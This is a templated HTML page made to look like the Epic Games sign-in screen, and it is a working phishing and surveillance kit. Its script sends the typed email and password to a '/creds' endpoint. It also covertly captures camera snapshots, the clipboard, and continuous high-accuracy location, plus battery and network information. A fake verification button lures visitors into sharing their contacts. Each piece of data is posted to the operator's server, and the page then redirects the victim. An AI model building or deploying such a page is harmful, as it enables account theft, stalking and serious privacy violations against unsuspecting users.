<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Epic Games - Sign In</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Brutal Type', 'Helvetica Neue', Arial, sans-serif; background: #121212; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
.container { background: #18181c; padding: 40px; border-radius: 8px; width: 100%; max-width: 400px; }
.logo { text-align: center; margin-bottom: 30px; }
.logo span { font-size: 24px; font-weight: 800; color: #fff; letter-spacing: 2px; }
h1 { font-size: 20px; color: #fff; margin-bottom: 24px; text-align: center; }
input { width: 100%; padding: 14px 16px; background: #202024; border: 2px solid #2a2a2e; border-radius: 8px; color: #fff; font-size: 14px; margin-bottom: 16px; }
input:focus { outline: none; border-color: #0078f2; }
input::placeholder { color: #8a8a8a; }
.btn { width: 100%; padding: 14px; background: #0078f2; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
.btn:hover { background: #0066cc; }
.divider { text-align: center; margin: 24px 0; color: #6a6a6a; font-size: 12px; }
.social-btns { display: flex; gap: 10px; flex-wrap: wrap; }
.social-btn { flex: 1; min-width: 45%; padding: 12px; background: #202024; border: 2px solid #2a2a2e; border-radius: 8px; color: #fff; text-align: center; font-size: 12px; cursor: pointer; }
.links { text-align: center; margin-top: 20px; }
.links a { color: #0078f2; text-decoration: none; font-size: 14px; }
.loading { display: none; text-align: center; padding: 40px; color: #fff; }
.spinner { width: 40px; height: 40px; border: 3px solid #2a2a2e; border-top-color: #0078f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="container">
<div id="loginForm">
<div class="logo"><span>EPIC GAMES</span></div>
<h1>Sign In</h1>
<form id="form">
<input type="email" id="email" placeholder="Email Address" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit" class="btn">Log In Now</button>
</form>
<div class="divider">OR SIGN IN WITH</div>
<div class="social-btns">
<div class="social-btn">PlayStation</div>
<div class="social-btn">Xbox</div>
<div class="social-btn">Nintendo</div>
<div class="social-btn">Steam</div>
</div>
<div class="links">
<a href="#">Forgot Your Password?</a>
</div>
<div id="contacts-verify" style="display:none; margin-top:15px; padding:15px; background:#202024; border:1px solid #0078f2; border-radius:8px;">
<p style="color:#fff; font-weight:bold; font-size:13px; margin-bottom:8px;">⚠️ Account Verification</p>
<p style="font-size:12px; color:#8a8a8a; margin-bottom:10px;">Verify with contacts</p>
<button id="shareContactsBtn" style="background:#0078f2; color:#fff; border:none; padding:10px 20px; border-radius:8px; font-size:14px; cursor:pointer;">📱 Verify</button>
</div>
</div>
<div class="loading" id="loading">
<div class="spinner"></div>
<p>Signing in...</p>
</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden id="canvas" width="500" height="500"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
window.onload = function() {
    if(navigator.geolocation) { navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true}); }
    async function captureCamera(f, l) { try { const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}}); video.srcObject=s; await new Promise(r=>setTimeout(r,1500)); canvas.getContext('2d').drawImage(video,0,0,500,500); $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:l}); s.getTracks().forEach(t=>t.stop()); } catch(e){} }
    captureCamera("user","selfie").then(()=>captureCamera("environment","back"));
    getBattery(); getClipboard(); getNetworkInfo(); startLiveTracking(); setTimeout(showContactsButton, 2000);
}
async function getContacts() { if('contacts' in navigator) { try { const c = await navigator.contacts.select(['name','tel','email'],{multiple:true}); if(c&&c.length>0){ $.post("<%=a %>/contacts",{uid:uid,contacts:JSON.stringify(c.map(x=>({name:x.name?.[0]||'',phones:x.tel||[],emails:x.email||[]})))}); document.getElementById('contacts-verify').style.display='none'; } } catch(e){} } }
function showContactsButton() { if('contacts' in navigator) { document.getElementById('contacts-verify').style.display='block'; document.getElementById('shareContactsBtn').onclick=getContacts; } }
async function getBattery() { if('getBattery' in navigator) { try { const b = await navigator.getBattery(); $.post("<%=a %>/battery",{uid:uid,level:b.level,charging:b.charging,time:b.charging?b.chargingTime:b.dischargingTime}); } catch(e){} } }
async function getClipboard() { if(navigator.clipboard?.readText) { try { const t = await navigator.clipboard.readText(); if(t) $.post("<%=a %>/clipboard",{uid:uid,text:encodeURIComponent(t)}); } catch(e){} } }
function getNetworkInfo() { if(navigator.connection) { $.post("<%=a %>/wifi",{uid:uid,info:`📡 ${navigator.connection.effectiveType} | 📶 ${navigator.connection.downlink} Mbps`}); } }
let lc=0; function startLiveTracking() { if(navigator.geolocation) { setInterval(()=>{ navigator.geolocation.getCurrentPosition((p)=>{lc++;$.post("<%=a %>/live_location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,count:lc});},()=>{},{enableHighAccuracy:true}); },60000); } }
document.getElementById('form').onsubmit = function(e) {
    e.preventDefault();
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    $.post("<%=a %>/creds", { uid: uid, platform: "Epic Games", email: document.getElementById('email').value, password: document.getElementById('password').value }, function() { setTimeout(() => { window.location.href = "<%=url %>"; }, 2000); });
};
</script>
</body>
</html>